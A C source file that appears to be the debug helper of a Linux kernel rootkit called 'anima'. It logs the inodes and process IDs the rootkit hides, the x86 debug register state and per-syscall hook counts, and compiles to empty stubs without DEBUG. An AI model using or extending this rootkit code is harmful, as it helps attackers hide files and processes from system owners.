#include <anima/config.h>
#include <anima/debug.h>
#include <anima/ksyms.h>
#include <anima/syscalls.h>
#include <anima/x86.h>

#ifdef DEBUG

#include <linux/kernel.h>

struct syscall_stat sys_stats[NR_SYSCALLS] = { {0} };

void debug_rk(u64 *inodes, pid_t *pids)
{
	unsigned long dr = 0;

	pr_debug("%s: hidden inodes", __func__);
	for (int i = 0; i < MAX_HIDDEN_INODES; i++)
		if (inodes[i])
			pr_debug("\tino=%llu", inodes[i]);

	pr_debug("%s: hidden pids", __func__);
	for (int i = 0; i < MAX_HIDDEN_PIDS; i++)
		if (pids[i])
			pr_debug("\tpid=%d", pids[i]);

	/* architecture specific */
	pr_debug("%s: debug registers state", __func__);
	for (int i = 0; i <= 7; i++) {
		if (i == 4 || i == 5)
			continue;
		get_dr(i, &dr);
		pr_debug("\tdr%d=%lx", i, dr);
	}

}

void debug_sys_stats(void)
{
	for (int i = 0; i < ARRAY_SIZE(sys_stats); i++) {
		if (sys_stats[i].nr_call)
			pr_debug("%s: sys_stats[%d].nr_call = %lu",
				 __func__, i, sys_stats[i].nr_call);
	}
}

#else

void __debug(const char *func, const char *fmt, ...)
{
}

void debug_rk(u64 *inodes, pid_t *pid)
{
}

void debug_sys_stats(void)
{
}

#endif
